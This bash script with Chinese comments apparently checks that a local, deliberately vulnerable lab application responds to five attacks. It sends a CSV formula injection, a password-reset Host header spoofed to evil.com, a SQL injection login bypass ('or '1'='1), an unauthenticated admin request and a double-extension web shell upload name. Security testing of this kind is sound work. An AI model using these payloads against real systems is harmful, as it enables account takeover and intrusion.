#!/bin/bash
# 其他漏洞类型验证脚本
# 漏洞类型: CSV Injection, Password Reset, Login Bypass, Unauthorized Access, Blacklist Bypass

set -e

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

BASE_URL="http://localhost:8080"
TOTAL=0
PASSED=0
FAILED=0

echo -e "${BLUE}========================================${NC}"
echo -e "${BLUE}其他漏洞类型验证脚本${NC}"
echo -e "${BLUE}========================================${NC}"
echo ""

# CSV Injection
echo -e "${BLUE}=== 1. CSV Injection ===${NC}"
curl -s "${BASE_URL}/csv/export?username=user1&email=test@test.com&amount==10+20" -o /tmp/test.csv 2>/dev/null
if grep -q "=10+20" /tmp/test.csv; then
    echo -e "  ${GREEN}[✓] CSV 公式注入${NC}"
    PASSED=$((PASSED + 1))
else
    echo -e "  ${RED}[✗] CSV 公式注入${NC}"
    FAILED=$((FAILED + 1))
fi
TOTAL=$((TOTAL + 1))

# Password Reset
echo -e "\n${BLUE}=== 2. Password Reset ===${NC}"
response=$(curl -s "${BASE_URL}/reset/request?username=user1" -H "Host: evil.com")
if echo "$response" | grep -q "evil.com"; then
    echo -e "  ${GREEN}[✓] Host 头注入${NC}"
    echo "$response" | grep -A1 "重置链接"
    PASSED=$((PASSED + 1))
else
    echo -e "  ${RED}[✗] Host 头注入${NC}"
    FAILED=$((FAILED + 1))
fi
TOTAL=$((TOTAL + 1))

# Login Bypass
echo -e "\n${BLUE}=== 3. Login Bypass ===${NC}"
response=$(curl -s -X POST "${BASE_URL}/login/sql?username=admin' or '1'='1&password=anything")
if echo "$response" | grep -q "登录成功"; then
    echo -e "  ${GREEN}[✓] SQL 万能密码${NC}"
    PASSED=$((PASSED + 1))
else
    echo -e "  ${RED}[✗] SQL 万能密码${NC}"
    FAILED=$((FAILED + 1))
fi
TOTAL=$((TOTAL + 1))

# Unauthorized Access
echo -e "\n${BLUE}=== 4. Unauthorized Access ===${NC}"
response=$(curl -s "${BASE_URL}/admin/dashboard")
if echo "$response" | grep -q "管理员面板"; then
    echo -e "  ${GREEN}[✓] 未授权访问${NC}"
    PASSED=$((PASSED + 1))
else
    echo -e "  ${RED}[✗] 未授权访问${NC}"
    FAILED=$((FAILED + 1))
fi
TOTAL=$((TOTAL + 1))

# Blacklist Bypass
echo -e "\n${BLUE}=== 5. Blacklist Bypass ===${NC}"
response=$(curl -s -X POST "${BASE_URL}/upload/double?filename=shell.jsp.jpg")
if echo "$response" | grep -q "上传成功"; then
    echo -e "  ${GREEN}[✓] 双重扩展名绕过${NC}"
    PASSED=$((PASSED + 1))
else
    echo -e "  ${RED}[✗] 双重扩展名绕过${NC}"
    FAILED=$((FAILED + 1))
fi
TOTAL=$((TOTAL + 1))

# Summary
echo -e "\n${BLUE}========================================${NC}"
echo -e "${BLUE}测试总结${NC}"
echo -e "${BLUE}========================================${NC}"
echo -e "总测试数: ${YELLOW}$TOTAL${NC}"
echo -e "通过: ${GREEN}$PASSED${NC}"
echo -e "失败: ${RED}$FAILED${NC}"
echo -e "成功率: ${YELLOW}$(awk "BEGIN {printf \"%.1f\", ($PASSED/$TOTAL)*100}")%${NC}"

if [ $FAILED -eq 0 ]; then
    echo -e "\n${GREEN}所有测试通过！${NC}"
    exit 0
else
    echo -e "\n${YELLOW}有 $FAILED 个测试失败${NC}"
    exit 0
fi
